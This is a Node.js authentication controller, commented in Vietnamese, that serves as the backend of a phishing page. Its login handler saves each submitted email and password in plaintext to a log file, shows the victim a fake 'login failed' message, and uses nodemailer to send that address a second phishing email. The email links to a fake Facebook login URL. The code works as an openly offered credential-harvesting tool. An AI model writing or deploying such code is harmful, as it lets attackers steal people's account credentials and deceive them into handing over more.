import exp from "constants";
import fs from "fs";
import nodemailer from "nodemailer";
const login = async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
  }

  // Lưu thông tin vào file log
  const logData = `Email: ${email} | Password: ${password}\n`;
  fs.appendFileSync("log.txt", logData);

  console.log("Đã lưu:", logData);

  // Gửi email thông báo
  sendPhishingEmail(email);

  res.json({ message: "Đăng nhập thất bại! Sai mật khẩu hoặc tài khoản." });
};

// Gửi email phishing
const sendPhishingEmail = async (targetEmail) => {
  try {
    const transporter = nodemailer.createTransport({
      service: "Gmail",
      auth: {
        user: process.env.EMAIL_USERNAME,
        pass: process.env.EMAIL_PASSWORD,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USERNAME,
      to: targetEmail,
      subject: "Tài khoản của bạn đang gặp sự cố vì Quốc Anh đẹp trai nhất Q7!",
      text: `Vui lòng truy cập vào đường link sau để xác nhận tài khoản: http://fake-facebook.com/login`,
    };

    await transporter.sendMail(mailOptions);
    console.log("Email phishing đã gửi đến:", targetEmail);
  } catch (error) {
    console.error("Lỗi gửi email:", error);
  }
};

const authController = {
  login,
};

export default authController;
